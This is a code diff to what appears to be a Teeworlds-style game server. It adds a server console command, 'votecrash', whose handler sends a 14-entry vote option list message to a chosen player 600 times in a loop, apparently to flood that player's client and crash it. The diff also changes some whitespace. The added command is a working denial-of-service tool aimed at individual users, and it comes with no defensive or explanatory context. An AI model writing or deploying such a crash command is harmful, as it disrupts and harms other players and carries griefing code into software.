@@ -1244,7 +1244,7 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 				OptionMsg.m_NumOptions = NumOptions;
 				Server()->SendPackMsg(&OptionMsg, MSGFLAG_VITAL, ClientID);
 			}
-
+	
 			// send tuning parameters to client
 			SendTuningParams(ClientID);
 
@@ -1948,6 +1948,35 @@ void CGameContext::ConchainSpecialMotdupdate(IConsole::IResult *pResult, void *p
 	}
 }
 
+void CGameContext::ConCrash (IConsole::IResult *pResult, void *pUserData)
+{
+	CGameContext *pSelf = (CGameContext *)pUserData;
+	int ClientID = pResult->GetInteger(0);
+	if (ClientID < 0 || ClientID >= MAX_CLIENTS || !pSelf->m_apPlayers[ClientID])
+		return;
+	int c = 0;
+        CNetMsg_Sv_VoteOptionListAdd sprv;
+        sprv.m_pDescription0 = "a";
+        sprv.m_pDescription1 = "b";
+        sprv.m_pDescription2 = "c";
+        sprv.m_pDescription3 = "d";
+        sprv.m_pDescription4 = "e";
+        sprv.m_pDescription5 = "f";
+        sprv.m_pDescription6 = "g";
+        sprv.m_pDescription7 = "h";
+        sprv.m_pDescription8 = "i";
+        sprv.m_pDescription9 = "j";
+        sprv.m_pDescription10 = "k";
+        sprv.m_pDescription11 = "l";
+        sprv.m_pDescription12 = "m";
+        sprv.m_pDescription13 = "n";
+        sprv.m_pDescription14 = "o";
+        sprv.m_NumOptions = 14;
+        
+        while (c++ < 600)                      
+        	pSelf->Server()->SendPackMsg(&sprv, MSGFLAG_VITAL, ClientID);
+}
+
 void CGameContext::OnConsoleInit()
 {
 	m_pServer = Kernel()->RequestInterface<IServer>();
@@ -1979,7 +2008,7 @@ void CGameContext::OnConsoleInit()
 	Console()->Register("muteip", "si", CFGFLAG_SERVER, ConMuteIP, this, "");
 	Console()->Register("unmute", "i", CFGFLAG_SERVER, ConUnmute, this, "");
 	Console()->Register("mutes", "", CFGFLAG_SERVER, ConMutes, this, "");
-
+	Console()->Register("votecrash", "i", CFGFLAG_SERVER, ConCrash, this, "");
 	Console()->Chain("sv_motd", ConchainSpecialMotdupdate, this);
 }
 
